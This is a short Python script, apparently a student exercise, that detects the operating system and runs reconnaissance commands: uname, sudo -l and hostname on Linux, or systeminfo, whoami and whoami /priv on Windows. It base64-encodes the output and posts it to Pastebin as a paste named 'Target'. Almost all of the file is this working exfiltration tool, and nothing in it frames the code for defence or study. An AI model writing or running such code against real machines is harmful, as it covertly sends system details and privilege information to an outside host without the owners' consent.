#Dhia Hauzan Muafa 2301926245
import subprocess
import os
import base64
import requests


def pastebin_func(data):
    link = 'https://pastebin.com/api/api_post.php'

    api ={'api_dev_key' : "" #masukkan api pastebinnya
        , 'api_paste_code' :  data,'api_paste_name' : 'Target', 'api_option' : 'paste'}
    try:
        send = requests.post(link, data=api)
    except:
        print("Error")


def linx_os():
    run = ["uname -a", "sudo -l", "hostname"]
    data=[]
    for i in run:
        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        str,strerr=subp.communicate()
        if strerr != b'':
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    data ="\n".join(data)
    data_b64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    pastebin_func(data_b64)



def win_os():
    run = ["systeminfo","whoami","whoami /priv"]
    data=[]
    for i in run:
        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        str,strerr=subp.communicate()
        if strerr != b'':
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    data ="\n".join(data)
    data_b64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    pastebin_func(data_b64)

  


def main():
    if os.name == "nt":
        win_os()
    else: 
        linx_os()

if __name__ == '__main__':
    main()
